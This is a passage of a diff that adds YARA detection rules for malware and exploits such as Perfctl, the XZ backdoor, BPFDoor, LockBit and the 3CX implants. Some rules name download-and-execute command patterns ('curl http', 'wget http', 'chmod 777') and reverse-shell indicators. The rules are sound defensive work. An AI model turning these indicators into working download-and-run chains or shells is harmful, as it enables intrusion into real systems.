+      $xc1 = { 6C 6F 67 69 6E 3A 00 25 73 00 00 2F 62 69 6E 2F 73 68 00 2F 74 6D 70 2F 6C 6F 67 69 6E } 
+      $s1 = "/tmp/login" ascii fullword
+      $s2 = "npxXoudifFeEgGaACSnmcs[" ascii fullword
+      $sc1 = { 28 6E 69 6C 29 00 00 00 28 6E 75 6C 6C 29 } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 500KB and ( 1 of ( $x* ) or 2 of them )
+}
+
 rule SUSP_RDP_File_Indicators_Oct24_1_RID326A : DEMO SUSP T1021_001 T1203 T1566_001 {
    meta:
       description = "Detects characteristics found in malicious RDP files used as email attachments in spear phishing campaigns"
@@ -4126,6 +4543,51 @@ rule SUSP_RDP_File_Indicators_Oct24_1_RID326A : DEMO SUSP T1021_001 T1203 T1566_
       $s5 = "emoteapplicationicon:s:C:\\Windows\\SystemApps" wide
    condition: 
       filesize < 50KB and all of them
+}
+
+rule MAL_EXPL_Perfctl_Oct24_RID2E9D : DEMO EXPLOIT MAL {
+   meta:
+      description = "Detects exploits used in relation with Perfctl malware campaigns"
+      author = "Florian Roth"
+      reference = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/"
+      date = "2024-10-09 11:22:01"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "22e4a57ac560ebe1eff8957906589f4dd5934ee555ebcc0f7ba613b07fad2c13"
+      tags = "DEMO, EXPLOIT, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "Exploit failed. Target is most likely patched." ascii fullword
+      $s2 = "SHELL=pkexec" ascii fullword
+      $s3 = "/dump_" ascii fullword
+      $s4 = ".EYE$" ascii
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 30000KB and 2 of them or all of them
+}
+
+rule MAL_LNX_Perfctl_Oct24_RID2E56 : DEMO FILE LINUX MAL {
+   meta:
+      description = "Detects Perfctl malware samples"
+      author = "Florian Roth"
+      reference = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/"
+      date = "2024-10-09 11:10:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747"
+      hash2 = "ca3f246d635bfa560f6c839111be554a14735513e90b3e6784bedfe1930bdfd6"
+      tags = "DEMO, FILE, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $op1 = { 83 45 f8 01 8b 45 f8 48 3b 45 98 0f 82 1b ff ff ff 90 c9 c3 55 } 
+      $op2 = { 48 8b 55 a0 48 01 ca 0f b6 0a 48 8b 55 a8 89 c0 88 4c 02 18 8b 45 fc 83 e0 3f } 
+      $op3 = { 88 4c 10 58 83 45 f8 01 83 7d f8 03 0f 86 68 ff ff ff 90 c9 c3 55 } 
+      $op4 = { 48 83 ec 68 48 89 7d a8 48 89 75 a0 48 89 55 98 48 8b 45 a8 48 8b 00 83 e0 3f 89 45 fc } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 300KB and 2 of them
 }
 
 rule WEBSHELL_JAVA_VersaMem_JAR_Aug24_2_RID3216 : DEMO FILE G1017 T1505_003 WEBSHELL {
@@ -4233,6 +4695,79 @@ rule SUSP_BAT_OBFUSC_Jul24_3_RID2E35 : DEMO OBFUS SCRIPT SUSP T1027 {
       filesize < 300KB and all of them
 }
 
+rule APT_MAL_APT27_Rshell_Jul24_1_RID3025 : APT DEMO FILE G0027 MAL T1070_003 {
+   meta:
+      description = "Detects RSHELL / SYSUPDATE backdoor used by APT27"
+      author = "Florian Roth"
+      reference = "https://x.com/bfv_bund/status/1811364839656185985?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
+      date = "2024-07-11 12:27:21"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "0433edfad648e1e29be54101abaded690302dc7e49ad916cfbbddf99b3ade12c"
+      hash2 = "10bb89fdf25c88d3c5623e8d68573124c9a42549750014e3675e2ca342aeba4a"
+      hash3 = "2603e1f61363451891c97b0c4ce8acfbfb680d3df4282f9d151ecce3a5679616"
+      tags = "APT, DEMO, FILE, G0027, MAL, T1070_003"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $a1 = "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%" ascii
+      $a2 = "/proc/self/exe" ascii
+      $s1 = "HISTFILE" ascii fullword
+      $s2 = "/tmp/guid" ascii fullword
+      $sop1 = { e8 ?? ?? ?? ?? c7 43 04 00 00 00 00 8b 3b 85 ff 7e 2? e8 ?? ?? 0? 00 85 c0 7e 0? } 
+      $sop2 = { c7 43 04 00 00 00 00 8b 3b 85 ff 7e 2? e8 ?? ?? 0? 00 85 c0 7e 0? f7 d8 } 
+   condition: 
+      ( uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and filesize < 2MB and all of ( $a* ) and 2 of ( $s* ) or 3 of ( $s* )
+}
+
+rule SUSP_LNX_Base64_Download_Exec_Apr24_RID3354 : DEMO LINUX SCRIPT SUSP T1105 T1132_001 {
+   meta:
+      description = "Detects suspicious base64 encoded shell commands used for downloading and executing further stages"
+      author = "Paul Hager"
+      reference = "Internal Research"
+      date = "2024-04-18 14:43:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, SUSP, T1105, T1132_001"
+      minimum_yara = "4.0.0"
+      
+   strings:
+      $sa1 = "curl http" base64
+      $sa2 = "wget http" base64
+      $sb1 = "chmod 777 " base64
+      $sb2 = "/tmp/" base64
+   condition: 
+      1 of ( $sa* ) and all of ( $sb* )
+}
+
+rule SUSP_LNX_Base64_Exec_Apr24_RID2FBD : CVE_2024_3400 DEMO LINUX SCRIPT SUSP T1105 T1132_001 {
+   meta:
+      description = "Detects suspicious base64 encoded shell commands (as seen in Palo Alto CVE-2024-3400 exploitation)"
+      author = "Christian Burkard"
+      reference = "Internal Research"
+      date = "2024-04-18 12:10:01"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      modified = "2025-03-21"
+      id = "2da3d050-86b0-5903-97eb-c5f39ce4f3a3"
+      tags = "CVE_2024_3400, DEMO, LINUX, SCRIPT, SUSP, T1105, T1132_001"
+      minimum_yara = "4.0.0"
+      
+   strings:
+      $s1 = "curl http://" base64
+      $s2 = "wget http://" base64
+      $s3 = ";chmod 777 " base64
+      $mirai = "country=" 
+      $fp1 = "<html" 
+      $fp2 = "<?xml" 
+   condition: 
+      filesize < 800KB and 1 of ( $s* ) and not $mirai and not 1 of ( $fp* )
+}
+
 rule SUSP_PY_Import_Statement_Apr24_1_RID32CA : DEMO SCRIPT SUSP T1059_006 {
    meta:
       description = "Detects suspicious Python import statement and socket usage often found in Python reverse shells"
@@ -4313,6 +4848,30 @@ rule BCKDR_XZUtil_Script_CVE_2024_3094_Mar24_1_RID3402 : CVE_2024_3094 DEMO SCRI
       $x3 = "eval $zrKcKQ" ascii
    condition: 
       1 of them
+}
+
+rule BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1_RID33F2 : CVE_2024_3094 DEMO FILE {
+   meta:
+      description = "Detects injected code used by the backdoored XZ library (xzutil) CVE-2024-3094."
+      author = "Florian Roth"
+      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
+      date = "2024-03-30 15:09:31"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae"
+      hash2 = "605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4"
+      hash3 = "8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd"
+      tags = "CVE_2024_3094, DEMO, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $op1 = { 48 8d 7c 24 08 f3 ab 48 8d 44 24 08 48 89 d1 4c 89 c7 48 89 c2 e8 ?? ?? ?? ?? 89 c2 } 
+      $op2 = { 31 c0 49 89 ff b9 16 00 00 00 4d 89 c5 48 8d 7c 24 48 4d 89 ce f3 ab 48 8d 44 24 48 } 
+      $op3 = { 4d 8b 6c 24 08 45 8b 3c 24 4c 8b 63 10 89 85 78 f1 ff ff 31 c0 83 bd 78 f1 ff ff 00 f3 ab 79 07 } 
+      $xc1 = { F3 0F 1E FA 55 48 89 F5 4C 89 CE 53 89 FB 81 E7 00 00 00 80 48 83 EC 28 48 89 54 24 18 48 89 4C 24 10 } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and ( all of ( $op* ) or $xc1 )
 }
 
 rule BCKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1_RID358B : CVE_2024_3094 DEMO {
@@ -4807,6 +5366,33 @@ rule MAL_Loader_TurtleLoader_Nov23_RID31CE : CVE_2023_47246 DEMO EXE FILE MAL {
       uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them
 }
 
+rule MAL_WIPER_BiBi_Oct23_RID2D70 : DEMO EXE FILE LINUX MAL {
+   meta:
+      description = "Detects BiBi wiper samples for Windows and Linux"
+      author = "Florian Roth"
+      reference = "https://x.com/ESETresearch/status/1719437301900595444?s=20"
+      date = "2023-10-30 10:31:51"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      modified = "2023-11-01"
+      hash1 = "23bae09b5699c2d5c4cb1b8aa908a3af898b00f88f06e021edcb16d7d558efad"
+      hash2 = "40417e937cd244b2f928150cae6fa0eff5551fdb401ea072f6ecdda67a747e17"
+      tags = "DEMO, EXE, FILE, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "send attempt while closed" ascii fullword
+      $s2 = "[+] CPU cores: %d, Threads: %d" ascii fullword
+      $s3 = "[+] Stats: %d | %d" ascii fullword
+      $opw1 = { 33 c0 88 45 48 b8 01 00 00 00 86 45 48 45 8b f5 48 8d 3d de f5 ff ff 0f 57 c9 f3 0f 7f 4d b8 } 
+      $opw2 = { 2d ce b5 00 00 c5 fa e6 f5 e9 40 fe ff ff 0f 1f 44 00 00 75 2e c5 fb 10 0d 26 b4 00 00 44 8b 05 5f b6 00 00 e8 ca 0d 00 00 } 
+      $opl1 = { 4c 8d 44 24 08 48 89 f7 48 ff c2 48 83 c6 04 e8 c7 fb ff ff 41 89 c1 0f b6 42 ff 41 0f af c1 } 
+      $opl2 = { e8 6f fb ff ff 49 8d 78 f8 89 c0 48 01 c2 48 89 15 09 fb 24 00 e8 5a fb ff ff 49 8d 78 fc 6b f0 06 } 
+   condition: 
+      ( uint16 ( 0 ) == 0x5a4d or uint16 ( 0 ) == 0x457f ) and filesize < 4000KB and 2 of them
+}
+
 rule SUSP_THOR_Unsigned_Oct23_1_RID300E : DEMO EXE FILE SUSP {
    meta:
       description = "Detects unsigned version of THOR scanner, which could be a backdoored / modified version of the scanner"
@@ -4848,6 +5434,57 @@ rule SUSP_EXPL_LIBCUE_CVE_2023_43641_Oct23_1_RID3245 : CVE_2023_43641 DEMO EXPLO
       $s1 = "INDEX 4294" 
    condition: 
       filesize < 100KB and all of them
+}
+
+rule MAL_LNX_CamaroDragon_Sheel_Oct23_RID3283 : DEMO G0129 LINUX MAL {
+   meta:
+      description = "Detects CamaroDragon's tool named sheel"
+      author = "Florian Roth"
+      reference = "https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/"
+      date = "2023-10-06 14:08:21"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "7985f992dcc6fcce76ee2892700c8538af075bd991625156bf2482dbfebd5a5a"
+      tags = "DEMO, G0129, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "-h server_ip -p server_port -i update_index[0-4] [-r]" ascii fullword
+      $s1 = "read_ip" ascii fullword
+      $s2 = "open fail.%m" ascii fullword
+      $s3 = "ri:h:p:" ascii fullword
+      $s4 = "update server list success!" ascii fullword
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 30KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
+}
+
+rule MAL_LNX_CamaroDragon_HorseShell_Oct23_RID348B : DEMO G0129 LINUX MAL {
+   meta:
+      description = "Detects CamaroDragon's HorseShell implant for routers"
+      author = "Florian Roth"
+      reference = "https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/"
+      date = "2023-10-06 15:35:01"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "998788472cb1502c03675a15a9f09b12f3877a5aeb687f891458a414b8e0d66c"
+      tags = "DEMO, G0129, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "echo \"start shell '%s' failed!\" > .remote_shell.log" ascii fullword
+      $x2 = "*****recv NET_REQ_HORSE_SHELL REQ_CONNECT_PORT*****" ascii fullword
+      $s1 = "m.cremessage.com" ascii fullword
+      $s2 = "POST http://%s/index.php HTTP/1.1" ascii fullword
+      $s3 = "wzsw_encrypt_buf" ascii fullword
+      $s4 = "body:%d-%s" ascii fullword
+      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident" ascii fullword
+      $s6 = "process_http_read_events" ascii fullword
+      $op1 = { c4 34 42 00 02 30 63 00 40 10 60 00 09 ae 62 00 48 8e 62 00 cc } 
+      $op2 = { 27 f4 8c 46 27 f0 03 20 f8 09 00 60 28 21 } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 600KB and ( 1 of ( $x* ) or 3 of them ) or 5 of them
 }
 
 rule LOG_EXPL_SUSP_TeamCity_CVE_2023_42793_Oct23_1_RID34F9 : CVE_2023_42793 DEMO EXPLOIT LOG SUSP {
@@ -5176,6 +5813,28 @@ rule EXPL_Citrix_Netscaler_ADC_ForensicArtifacts_CVE_2023_3519_Jul23_2_RID3D90 :
       filesize < 10MB and 1 of them
 }
 
+rule APT_Equation_Group_Op_Triangulation_TriangleDB_Implant_Jun23_1_RID3EB5 : APT DEMO G0020 MACOS {
+   meta:
+      description = "Detects TriangleDB implant found being used in Operation Triangulation on iOS devices (maybe also used on macOS systems)"
+      author = "Florian Roth"
+      reference = "https://securelist.com/triangledb-triangulation-implant/110050/"
+      date = "2023-06-21 22:48:41"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "APT, DEMO, G0020, MACOS"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "unmungeHexString" ascii fullword
+      $s2 = "CRPwrInfo" ascii fullword
+      $s3 = "CRConfig" ascii fullword
+      $s4 = "CRXConfigureDBServer" ascii fullword
+   condition: 
+      ( uint16 ( 0 ) == 0xfacf and filesize < 30MB and $s1 and 2 of them ) or all of them
+}
+
 rule MAL_Compromised_Cert_DuckTail_Stealer_Jun23_RID3749 : DEMO EXE FILE MAL {
    meta:
       description = "Detects binaries signed with certificates used by DuckTail stealer"
@@ -5213,6 +5872,33 @@ rule MAL_Compromised_Cert_DuckTail_Stealer_Jun23_RID3749 : DEMO EXE FILE MAL {
       $se14 = { 57 9E 5C 89 B0 85 A7 96 B3 3C F3 19 } 
    condition: 
       uint16 ( 0 ) == 0x5a4d and 1 of ( $sx* ) and 1 of ( $se* )
+}
+
+rule APT_MAL_UNC4841_SEASPY_Jun23_1_RID2FFA : APT CVE_2023_2868 DEMO MAL {
+   meta:
+      description = "Detects SEASPY malware used by UNC4841 in attacks against Barracuda ESG appliances exploiting CVE-2023-2868"
+      author = "Florian Roth"
+      reference = "https://blog.talosintelligence.com/alchimist-offensive-framework/"
+      date = "2023-06-16 12:20:11"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115"
+      tags = "APT, CVE_2023_2868, DEMO, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sx1 = "usage: ./BarracudaMailService <Network-Interface>. e.g.: ./BarracudaMailService eth0" ascii fullword
+      $s1 = "fcntl.tmp.amd64." ascii
+      $s2 = "Child process id:%d" ascii fullword
+      $s3 = "[*]Success!" ascii fullword
+      $s4 = "NO port code" ascii
+      $s5 = "enter open tty shell" ascii
+      $op1 = { 48 89 c6 f3 a6 0f 84 f7 01 00 00 bf 6c 84 5f 00 b9 05 00 00 00 48 89 c6 f3 a6 0f 84 6a 01 00 00 } 
+      $op2 = { f3 a6 0f 84 d2 00 00 00 48 89 de bf 51 5e 61 00 b9 05 00 00 00 f3 a6 74 21 48 89 de } 
+      $op3 = { 72 de 45 89 f4 e9 b8 f4 ff ff 48 8b 73 08 45 85 e4 ba 49 3d 62 00 b8 44 81 62 00 48 0f 45 d0 } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 9000KB and 3 of them or 5 of them
 }
 
 rule APT_MAL_UNC4841_SEASPY_LUA_Jun23_1_RID313B : APT DEMO MAL SCRIPT {
@@ -5306,6 +5992,72 @@ rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_3_RID37DC : DEMO EXPLOIT LOG {
       $s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii
    condition: 
       all of ( $s* )
+}
+
+rule HKTL_EXPL_POC_LibSSH_Auth_Bypass_CVE_2023_2283_Jun23_1_RID3855 : CVE_2023_2283 DEMO EXPLOIT FILE HKTL {
+   meta:
+      description = "Detects POC code used in attacks against libssh vulnerability CVE-2023-2283"
+      author = "Florian Roth"
+      reference = "https://github.com/github/securitylab/tree/1786eaae7f90d87ce633c46bbaa0691d2f9bf449/SecurityExploits/libssh/pubkey-auth-bypass-CVE-2023-2283"
+      date = "2023-06-08 18:16:41"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CVE_2023_2283, DEMO, EXPLOIT, FILE, HKTL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "nprocs = %d" ascii fullword
+      $s2 = "fork failed: %s" ascii fullword
+   condition: 
+      uint16 ( 0 ) == 0x457f and all of them
+}
+
+rule MAL_ELF_ReverseShell_SSLShell_Jun23_1_RID341E : CVE_2023_2868 DEMO FILE LINUX MAL SCRIPT {
+   meta:
+      description = "Detects a reverse shell named SSLShell used in Barracuda ESG exploitation (CVE-2023-2868)"
+      author = "Florian Roth"
+      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
+      date = "2023-06-07 15:16:51"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "8849a3273e0362c45b4928375d196714224ec22cb1d2df5d029bf57349860347"
+      tags = "CVE_2023_2868, DEMO, FILE, LINUX, MAL, SCRIPT"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sc1 = { 00 2D 63 00 2F 62 69 6E 2F 73 68 00 } 
+      $s1 = "SSLShell" 
+   condition: 
+      uint32be ( 0 ) == 0x7f454c46 and uint16 ( 0x10 ) == 0x0002 and filesize < 5MB and all of them
+}
+
+rule MAL_ELF_SALTWATER_Jun23_1_RID2EB8 : CVE_2023_2868 DEMO LINUX MAL {
+   meta:
+      description = "Detects SALTWATER malware used in Barracuda ESG exploitations (CVE-2023-2868)"
+      author = "Florian Roth"
+      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
+      date = "2023-06-07 11:26:31"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "601f44cc102ae5a113c0b5fe5d18350db8a24d780c0ff289880cc45de28e2b80"
+      tags = "CVE_2023_2868, DEMO, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "libbindshell.so" 
+      $s1 = "ShellChannel" 
+      $s2 = "MyWriteAll" 
+      $s3 = "CheckRemoteIp" 
+      $s4 = "run_cmd" 
+      $s5 = "DownloadByProxyChannel" 
+      $s6 = "[-] error: popen failed" 
+      $s7 = "/home/product/code/config/ssl_engine_cert.pem" 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( ( 1 of ( $x* ) and 2 of them ) or 3 of them ) or all of them
 }
 
 rule SUSP_Fake_AMSI_DLL_Jun23_1_RID2F77 : DEMO EXE FILE SUSP {
@@ -5422,6 +6174,59 @@ rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_1_RID37DA : DEMO EXPLOIT LOG {
       $x2 = " GET /human2.aspx - 443 " ascii
    condition: 
       1 of them
+}
+
+rule SUSP_HxD_Icon_Anomaly_May23_1_RID3152 : ANOMALY DEMO EXE FILE SUSP {
+   meta:
+      description = "Detects suspicious use of the free hex editor HxD's icon in PE files that don't seem to be a legitimate version of HxD"
+      author = "Florian Roth"
+      reference = "https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios"
+      date = "2023-05-29 13:17:31"
+      score = 65
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "ANOMALY, DEMO, EXE, FILE, SUSP"
+      required_modules = "pe"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $ac1 = { 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80 99 00 77 0D D0 99 98 09 99 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 0F F9 99 00 0D D0 99 98 09 9F 99 00 0D D0 99 98 09 FF 99 00 0D D0 99 98 09 FF 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 0F F9 99 00 0D D0 99 98 09 99 99 00 0D 09 99 80 9F F9 99 99 00 09 99 80 99 F9 99 99 00 09 99 80 FF } 
+      $ac2 = { FF FF FF FF FF FF FF FF FF FF FF FF FF FF B9 DE FA 68 B8 F4 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1 68 B8 F4 B9 DE FA FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF } 
+      $s1 = { 00 4D 00 61 00 EB 00 6C 00 20 00 48 00 F6 00 72 00 7A } 
+      $s2 = "mh-nexus.de" ascii wide
+      $upx1 = "UPX0" ascii fullword
+      $xs1 = "terminator" ascii wide fullword
+      $xs2 = "Terminator" ascii wide fullword
+   condition: 
+      uint16 ( 0 ) == 0x5a4d and 1 of ( $ac* ) and ( not 1 of ( $s* ) or filesize > 6930000 or ( pe.is_32bit ( ) and filesize < 1540000 and not $upx1 ) or ( pe.is_32bit ( ) and filesize < 590000 and $upx1 ) or ( pe.is_64bit ( ) and filesize < 6670000 and not $upx1 ) or ( pe.is_64bit ( ) and filesize < 1300000 and $upx1 ) or 1 of ( $xs* ) )
+}
+
+rule MAL_LNX_RedMenshen_BPFDoor_May23_1_RID32CA : DEMO FILE LINUX MAL {
+   meta:
+      description = "Detects BPFDoor malware"
+      author = "Florian Roth"
+      reference = "https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game"
+      date = "2023-05-11 14:20:11"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "afa8a32ec29a31f152ba20a30eb483520fe50f2dce6c9aa9135d88f7c9c511d7"
+      tags = "DEMO, FILE, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "[-] Execute command failed" ascii fullword
+      $x2 = "/var/run/initd.lock" ascii fullword
+      $xc1 = { 2F 00 3E 3E 00 65 78 69 74 00 72 00 } 
+      $sc1 = { 9F CD 30 44 } 
+      $sc2 = { 66 27 14 5E } 
+      $sa1 = "TLS-CHACHA20-POLY1305-SHA256" ascii fullword
+      $sop1 = { 48 83 c0 01 4c 39 f8 75 ea 4c 89 7c 24 68 48 69 c3 d0 00 00 00 48 8b 5c 24 50 48 8b 54 24 78 48 c7 44 24 38 00 00 00 00 } 
+      $sop2 = { 48 89 de f3 a5 89 03 8b 44 24 2c 39 44 24 28 44 89 4b 04 48 89 53 10 0f 95 c0 } 
+      $sop3 = { 49 d3 cd 4d 31 cd b1 29 49 89 e9 49 d3 c8 4d 31 c5 4c 03 68 10 48 89 f9 } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 900KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or 4 of them or ( all of ( $sc* ) and $sc1 in ( @sc2 [ 1 ] - 50 .. @sc2 [ 1 ] + 50 ) ) ) or ( 2 of ( $x* ) or 5 of them )
 }
 
 rule APT_MAL_RU_Snake_Indicators_May23_1_RID3370 : APT DEMO G0010 MAL RUSSIA {
@@ -5650,6 +6455,37 @@ rule MAL_RANSOM_LockBit_Locker_LOG_Apr23_1_RID3398 : CRIME DEMO LOG LockBit MAL 
       2 of them
 }
 
+rule MAL_RANSOM_LNX_macOS_LockBit_Apr23_1_RID331B : CRIME DEMO LINUX LockBit MACOS MAL RANSOM {
+   meta:
+      description = "Detects LockBit ransomware samples for Linux and macOS"
+      author = "Florian Roth"
+      reference = "https://twitter.com/malwrhunterteam/status/1647384505550876675?s=20"
+      date = "2023-04-15 14:33:41"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "0a2bffa0a30ec609d80591eef1d0994d8b37ab1f6a6bad7260d9d435067fb48e"
+      hash2 = "9ebcbaf3c9e2bbce6b2331238ab584f95f7ced326ca4aba2ddcc8aa8ee964f66"
+      hash3 = "a405d034c01a357a89c9988ffe8a46a165915df18fd297469b2bcaaf97578442"
+      tags = "CRIME, DEMO, LINUX, LockBit, MACOS, MAL, RANSOM"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "restore-my-files.txt" ascii fullword
+      $s1 = "ntuser.dat.log" ascii fullword
+      $s2 = "bootsect.bak" ascii fullword
+      $s3 = "autorun.inf" ascii fullword
+      $s4 = "lockbit" ascii fullword
+      $xc1 = { 33 38 36 00 63 6D 64 00 61 6E 69 00 61 64 76 00 6D 73 69 00 6D 73 70 00 63 6F 6D 00 6E 6C 73 } 
+      $xc2 = { 6E 74 6C 64 72 00 6E 74 75 73 65 72 2E 64 61 74 2E 6C 6F 67 00 62 6F 6F 74 73 65 63 74 2E 62 61 6B } 
+      $xc3 = { 76 6D 2E 73 74 61 74 73 2E 76 6D 2E 76 5F 66 72 65 65 5F 63 6F 75 6E 74 00 61 2B 00 2F 2A } 
+      $op1 = { 84 e5 f0 00 f0 e7 10 40 2d e9 2e 10 a0 e3 00 40 a0 e1 ?? fe ff } 
+      $op2 = { 00 90 a0 e3 40 20 58 e2 3f 80 08 e2 3f 30 c2 e3 09 20 98 e1 08 20 9d } 
+      $op3 = { 2d e9 01 70 43 e2 07 00 13 e1 01 60 a0 e1 08 d0 4d e2 02 40 } 
+   condition: 
+      ( uint32be ( 0 ) == 0x7f454c46 or uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and ( 1 of ( $x* ) or 3 of them ) or 2 of ( $x* ) or 5 of them
+}
+
 rule MAL_JS_EFile_Apr23_1_RID2D82 : DEMO MAL T1059_007 {
    meta:
       description = "Detects JavaScript malware used in eFile compromise"
@@ -5764,6 +6600,73 @@ rule APT_MAL_NK_3CX_ICONIC_Stealer_Mar23_1_RID330B : APT DEMO EXE MAL NK {
       uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 4 of them or 6 of them
 }
 
+rule APT_MAL_NK_3CX_macOS_Elextron_App_Mar23_1_RID352A : APT DEMO FILE MACOS MAL NK {
+   meta:
+      description = "Detects macOS malware used in the 3CX incident"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "Internal Research"
+      date = "2023-03-31 16:01:31"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "51079c7e549cbad25429ff98b6d6ca02dc9234e466dd9b75a5e05b9d7b95af72"
+      hash2 = "f7ba7f9bf608128894196cf7314f68b78d2a6df10718c8e0cd64dbe3b86bc730"
+      tags = "APT, DEMO, FILE, MACOS, MAL, NK"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $a1 = "com.apple.security.cs.allow-unsigned-executable-memory" ascii
+      $a2 = "com.electron.3cx-desktop-app" ascii fullword
+      $s1 = "s8T/RXMlALbXfowom9qk15FgtdI=" ascii
+      $s2 = "o8NQKPJE6voVZUIGtXihq7lp0cY=" ascii
+   condition: 
+      uint16 ( 0 ) == 0xfacf and filesize < 400KB and ( all of ( $a* ) and 1 of ( $s* ) )
+}
+
